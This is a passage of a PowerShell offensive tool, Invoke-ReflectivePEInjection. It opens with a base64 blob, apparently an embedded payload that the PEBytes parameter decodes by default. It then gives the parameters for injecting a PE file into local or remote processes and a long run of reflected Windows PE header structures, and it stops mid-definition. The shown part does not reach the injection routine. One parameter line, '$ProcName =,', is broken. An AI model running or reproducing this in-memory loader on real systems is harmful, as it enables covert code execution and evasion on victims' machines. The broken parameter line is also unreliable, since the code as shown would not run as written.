AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAA=

'

function Invoke-ReflectivePEInjection
{

[CmdletBinding(DefaultParameterSetName="WebFile")]
Param(
	[Parameter(ParameterSetName = "LocalFile", Position = 0, Mandatory = $false)]
	[String]
	$PEPath,
	
	[Parameter(ParameterSetName = "WebFile", Position = 0, Mandatory = $false)]
	[Uri]
	$PEUrl,

    [Parameter(ParameterSetName = "Bytes", Position = 0, Mandatory = $false)]
    [ValidateNotNullOrEmpty()]
    [Byte[]]
    $PEBytes = [System.Convert]::FromBase64String($InputString),
	
	[Parameter(Position = 1)]
	[String[]]
	$ComputerName,
	
	[Parameter(Position = 2)]
    [ValidateSet( 'WString', 'String', 'Void' )]
	[String]
	$FuncReturnType = 'Void',
	
	[Parameter(Position = 3)]
	[String]
	$ExeArgs,
	
	[Parameter(Position = 4)]
	[Int32]
	$ProcId,
	
	[Parameter(Position = 5)]
	[String]
	$ProcName =,

    [Parameter(Position = 6)]
    [Switch]
    $ForceASLR
)

Set-StrictMode -Version 2


$RemoteScriptBlock = {
	[CmdletBinding()]
	Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Byte[]]
		$PEBytes,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[String]
		$FuncReturnType,
				
		[Parameter(Position = 2, Mandatory = $true)]
		[Int32]
		$ProcId,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[String]
		$ProcName,

        [Parameter(Position = 4, Mandatory = $true)]
        [Bool]
        $ForceASLR
	)
	
	###################################
	##########  Win32 Stuff  ##########
	###################################
	Function Get-Win32Types
	{
		$Win32Types = New-Object System.Object

		#Define all the structures/enums that will be used
		#	This article shows you how to do this with reflection: http://www.exploit-monday.com/2012/07/structs-and-enums-using-reflection.html
		$Domain = [AppDomain]::CurrentDomain
		$DynamicAssembly = New-Object System.Reflection.AssemblyName('DynamicAssembly')
		$AssemblyBuilder = $Domain.DefineDynamicAssembly($DynamicAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
		$ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('DynamicModule', $false)
		$ConstructorInfo = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]


		############    ENUM    ############
		#Enum MachineType
		$TypeBuilder = $ModuleBuilder.DefineEnum('MachineType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('Native', [UInt16] 0) | Out-Null
		$TypeBuilder.DefineLiteral('I386', [UInt16] 0x014c) | Out-Null
		$TypeBuilder.DefineLiteral('Itanium', [UInt16] 0x0200) | Out-Null
		$TypeBuilder.DefineLiteral('x64', [UInt16] 0x8664) | Out-Null
		$MachineType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name MachineType -Value $MachineType

		#Enum MagicType
		$TypeBuilder = $ModuleBuilder.DefineEnum('MagicType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR32_MAGIC', [UInt16] 0x10b) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR64_MAGIC', [UInt16] 0x20b) | Out-Null
		$MagicType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name MagicType -Value $MagicType

		#Enum SubSystemType
		$TypeBuilder = $ModuleBuilder.DefineEnum('SubSystemType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_UNKNOWN', [UInt16] 0) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_NATIVE', [UInt16] 1) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_GUI', [UInt16] 2) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CUI', [UInt16] 3) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_POSIX_CUI', [UInt16] 7) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CE_GUI', [UInt16] 9) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_APPLICATION', [UInt16] 10) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER', [UInt16] 11) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_RUNTIME_DRIVER', [UInt16] 12) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_ROM', [UInt16] 13) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_XBOX', [UInt16] 14) | Out-Null
		$SubSystemType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name SubSystemType -Value $SubSystemType

		#Enum DllCharacteristicsType
		$TypeBuilder = $ModuleBuilder.DefineEnum('DllCharacteristicsType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('RES_0', [UInt16] 0x0001) | Out-Null
		$TypeBuilder.DefineLiteral('RES_1', [UInt16] 0x0002) | Out-Null
		$TypeBuilder.DefineLiteral('RES_2', [UInt16] 0x0004) | Out-Null
		$TypeBuilder.DefineLiteral('RES_3', [UInt16] 0x0008) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE', [UInt16] 0x0040) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_FORCE_INTEGRITY', [UInt16] 0x0080) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_NX_COMPAT', [UInt16] 0x0100) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_ISOLATION', [UInt16] 0x0200) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_SEH', [UInt16] 0x0400) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_BIND', [UInt16] 0x0800) | Out-Null
		$TypeBuilder.DefineLiteral('RES_4', [UInt16] 0x1000) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_WDM_DRIVER', [UInt16] 0x2000) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE', [UInt16] 0x8000) | Out-Null
		$DllCharacteristicsType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name DllCharacteristicsType -Value $DllCharacteristicsType

		###########    STRUCT    ###########
		#Struct IMAGE_DATA_DIRECTORY
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DATA_DIRECTORY', $Attributes, [System.ValueType], 8)
		($TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public')).SetOffset(0) | Out-Null
		($TypeBuilder.DefineField('Size', [UInt32], 'Public')).SetOffset(4) | Out-Null
		$IMAGE_DATA_DIRECTORY = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DATA_DIRECTORY -Value $IMAGE_DATA_DIRECTORY

		#Struct IMAGE_FILE_HEADER
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_FILE_HEADER', $Attributes, [System.ValueType], 20)
		$TypeBuilder.DefineField('Machine', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfSections', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToSymbolTable', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfSymbols', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('SizeOfOptionalHeader', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('Characteristics', [UInt16], 'Public') | Out-Null
		$IMAGE_FILE_HEADER = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_HEADER -Value $IMAGE_FILE_HEADER

		#Struct IMAGE_OPTIONAL_HEADER64
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER64', $Attributes, [System.ValueType], 240)
		($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
		($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
		($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
		($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
		($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
		($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
		($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
		($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
		($TypeBuilder.DefineField('ImageBase', [UInt64], 'Public')).SetOffset(24) | Out-Null
		($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
		($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
		($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
		($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
		($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
		($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
		($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
		($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
		($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
		($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
		($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
		($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
		($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackReserve', [UInt64], 'Public')).SetOffset(72) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackCommit', [UInt64], 'Public')).SetOffset(80) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt64], 'Public')).SetOffset(88) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt64], 'Public')).SetOffset(96) | Out-Null
		($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(104) | Out-Null
		($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(108) | Out-Null
		($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
		($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
		($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
		($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
		($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
		($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
		($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
		($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
		($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
		($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
		($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
		($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
		($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
		($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
		($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(224) | Out-Null
		($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(232) | Out-Null
		$IMAGE_OPTIONAL_HEADER64 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER64 -Value $IMAGE_OPTIONAL_HEADER64

		#Struct IMAGE_OPTIONAL_HEADER32
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER32', $Attributes, [System.ValueType], 224)
		($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
		($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
		($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
		($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
		($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
		($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
		($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
		($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
		($TypeBuilder.DefineField('BaseOfData', [UInt32], 'Public')).SetOffset(24) | Out-Null
		($TypeBuilder.DefineField('ImageBase', [UInt32], 'Public')).SetOffset(28) | Out-Null
		($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
		($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
		($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
		($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
		($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
		($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
		($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
		($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
		($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
		($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
		($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
		($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
		($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackReserve', [UInt32], 'Public')).SetOffset(72) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackCommit', [UInt32], 'Public')).SetOffset(76) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt32], 'Public')).SetOffset(80) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt32], 'Public')).SetOffset(84) | Out-Null
		($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(88) | Out-Null
		($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(92) | Out-Null
		($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(96) | Out-Null
		($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(104) | Out-Null
		($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
		($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
		($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
		($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
		($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
		($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
		($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
		($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
		($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
		($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
		($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
		($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
		($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
		($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
		$IMAGE_OPTIONAL_HEADER32 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER32 -Value $IMAGE_OPTIONAL_HEADER32

		#Struct IMAGE_NT_HEADERS64
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS64', $Attributes, [System.ValueType], 264)
		$TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
		$TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER64, 'Public') | Out-Null
		$IMAGE_NT_HEADERS64 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS64 -Value $IMAGE_NT_HEADERS64
		
		#Struct IMAGE_NT_HEADERS32
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS32', $Attributes, [System.ValueType], 248)
		$TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
		$TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER32, 'Public') | Out-Null
		$IMAGE_NT_HEADERS32 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS32 -Value $IMAGE_NT_HEADERS32

		#Struct IMAGE_DOS_HEADER
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DOS_HEADER', $Attributes, [System.ValueType], 64)
		$TypeBuilder.DefineField('e_magic', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cblp', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cp', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_crlc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cparhdr', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_minalloc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_maxalloc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_ss', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_sp', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_csum', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_ip', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cs', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_lfarlc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_ovno', [UInt16], 'Public') | Out-Null

		$e_resField = $TypeBuilder.DefineField('e_res', [UInt16[]], 'Public, HasFieldMarshal')
		$ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$FieldArray = @([System.Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))
		$AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 4))
		$e_resField.SetCustomAttribute($AttribBuilder)

		$TypeBuilder.DefineField('e_oemid', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_oeminfo', [UInt16], 'Public') | Out-Null

		$e_res2Field = $TypeBuilder.DefineField('e_res2', [UInt16[]], 'Public, HasFieldMarshal')
		$ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 10))
		$e_res2Field.SetCustomAttribute($AttribBuilder)

		$TypeBuilder.DefineField('e_lfanew', [Int32], 'Public') | Out-Null
		$IMAGE_DOS_HEADER = $TypeBuilder.CreateType()	
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DOS_HEADER -Value $IMAGE_DOS_HEADER

		#Struct IMAGE_SECTION_HEADER
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_SECTION_HEADER', $Attributes, [System.ValueType], 40)

		$nameField = $TypeBuilder.DefineField('Name', [Char[]], 'Public, HasFieldMarshal')
		$ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 8))
		$nameField.SetCustomAttribute($AttribBuilder)

		$TypeBuilder.DefineField('VirtualSize', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('SizeOfRawData', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToRawData', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToRelocations', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToLinenumbers', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfRelocations', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfLinenumbers', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$IMAGE_SECTION_HEADER = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_SECTION_HEADER -Value $IMAGE_SECTION_HEADER

		#Struct IMAGE_BASE_RELOCATION
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_BASE_RELOCATION', $Attributes, [System.ValueType], 8)
		$TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('SizeOfBlock', [UInt32], 'Public') | Out-Null
		$IMAGE_BASE_RELOCATION = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_BASE_RELOCATION -Value $IMAGE_BASE_RELOCATION

		#Struct IMAGE_IMPORT_DESCRIPTOR
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_IMPORT_DESCRIPTOR', $Attributes, [System.ValueType], 20)
		$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('ForwarderChain', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('FirstThunk', [UInt32], 'Public') | Out-Null
		$IMAGE_IMPORT_DESCRIPTOR = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_IMPORT_DESCRIPTOR -Value $IMAGE_IMPORT_DESCRIPTOR

		#Struct IMAGE_EXPORT_DIRECTORY
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_EXPORT_DIRECTORY', $Attributes, [System.ValueType], 40)
		$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('MajorVersion', [UInt16], 'Public') | Out-Null
